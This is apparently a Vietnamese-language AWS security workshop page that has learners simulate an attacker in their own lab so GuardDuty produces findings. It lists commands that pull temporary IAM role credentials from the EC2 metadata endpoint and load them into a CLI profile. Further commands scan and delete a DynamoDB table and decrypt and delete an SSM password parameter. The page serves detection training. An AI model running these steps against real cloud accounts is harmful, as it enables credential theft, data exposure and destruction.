---
title : "Create Findings"
date :  2025-06-11
weight : 2 
chapter : false
pre : " <b> 3.3. </b> "
---
### Tình huống 3: 
Bạn Long vừa nhận ra các cuộc tấn công vừa rồi là các cuộc tấn công giả lập, các Findings được tự động tạo ra từ CloudFormation Template để xem xét khả năng bảo mật của Security Hub và GuardDuty. Tuy nhiên rủi ro bảo mật vẫn còn có, một hacker tên Bảo đã tiến hành truy xuất thành công IAM security credential tạm thời được sinh ra bởi IAM role thuộc EC2 instance. Vậy hacker này đã tiến hành truy xuất ra sao?

**Truy xuất IAM security credential tạm thời với Systems Manager**

Để tiến hành cuộc tấn công cuối cùng này, Bảo cần phải truy xuất thành công IAM security credential tạm thời được sinh ra bởi IAM role thuộc EC2 instance. Bảo có thể thử 1 trong 2 cách sau:
1. Truy cập SSH vào EC2 instance và tiến hành truy vấn dữ liệu Metadata của EC2 instance.
2. Sử dụng chức năng Session Manager của dịch vụ AWS System Manager.

> Chúng ta sẽ tiến hành tạo các Findings 
1. Truy cập vào Session Manager ở ap-southeast-1.

![create findings](/images/3.attack/3.3/1.png)

2. Ở thanh điều hướng bên tay phải, chọn tiếp tục Start Session.

![create findings](/images/3.attack/3.3/2.png)

3. Ở mục **Target instances** chúng ta sẽ thấy một managed EC2 instance với định dạng tên như sau - **GuardDuty-Example: Compromised Instance: Scenario 3** với trạng thái SSM Agent ping status là Online.
4. Chọn instance **GuardDuty-Example: Compromised Instance: Scenario 3** và ấn **Start session**.

![create findings](/images/3.attack/3.3/3.png)

5. Thực hiện câu lệnh truy vấn dữ liệu Metadata:

         curl http://169.254.169.254/latest/meta-data/iam/security-credentials/GuardDuty-Example-EC2-Compromised

6. Mở notepad, tiến hành ghi chú một số thông tin quan trọng sau:
- Access Key ID.
- Secret Access Key.
- Session Token.

![create findings](/images/3.attack/3.3/4.png)

### Tạo AWS CLI Profile trên máy tính cá nhân
Sau khi thành công truy xuất IAM security credential tạm thời, chúng ta sẽ tiến hành tạo một AWS CLI Profile trên máy tính cá nhân. Từ Terminal/CMD/PowerShell, chúng ta tiến hành thay thế các <PLACEHOLDER> với giá trị cụ thể đã thu thập, sau đó thực hiện nhập các lệnh sau:

      aws configure set profile.iamhacker.region ap-southeast-1
      aws configure set profile.iamhacker.aws_access_key_id <ACCESS_KEY_ID>
      aws configure set profile.iamhacker.aws_secret_access_key <SECRET_ACCESS_KEY>
      aws configure set profile.iamhacker.aws_session_token <SESSION_TOKEN>

Chúng ta có thể sử dụng câu lệnh sau để tiến hành kiểm tra nhanh xem đã có AWS CLI Profile tên là **iamhacker** hay chưa.
      
      aws configure --profile iamhacker

![create findings](/images/3.attack/3.4/1.png)

#### Thực hiện câu lệnh AWS CLI bằng IAM security credential tạm thời
Bằng các câu lệnh AWS CLI dưới đây, chúng ta tiến hành thực hiện gọi API đến những dịch vụ AWS khác nhau.

**IAM user có bất kỳ quyền hạn nào?**
      
      aws iam get-user --profile iamhacker
      aws iam create-user --user-name BuiChiBao --profile iamhacker

![create findings](/images/3.attack/3.4/2.png)

> Như vậy IAM user không thể get-user cũng như create-user

**Liệu có quyền truy cập đến DynamoDB?**

      aws dynamodb list-tables --profile iamhacker
      aws dynamodb describe-table --table-name GuardDuty-Example-Customer-DB --profile iamhacker

![create findings](/images/3.attack/3.4/3.png)

![create findings](/images/3.attack/3.4/4.png)
**Liệu có quyền truy vấn dữ liệu đến DynamoDB?**

      aws dynamodb scan --table-name GuardDuty-Example-Customer-DB --profile iamhacker
      aws dynamodb delete-table --table-name GuardDuty-Example-Customer-DB --profile iamhacker
      aws dynamodb list-tables --profile iamhacker

![create findings](/images/3.attack/3.4/5.png)

![create findings](/images/3.attack/3.4/6.png)

> Như vậy hacker có quyền truy cập và truy vấn dữ liệu đến DynamoDB

**Liệu có thể truy cập đến System Manager Parameter Store?**

      aws ssm describe-parameters --profile iamhacker
      aws ssm get-parameters --names "gd_prod_dbpwd_sample" --profile iamhacker
      aws ssm get-parameters --names "gd_prod_dbpwd_sample" --with-decryption --profile iamhacker
      aws ssm delete-parameter --name "gd_prod_dbpwd_sample" --profile iamhacker

![create findings](/images/3.attack/3.4/7.png)

> Như vậy hacker có quyền truy cập đến System Manager Parameter Store
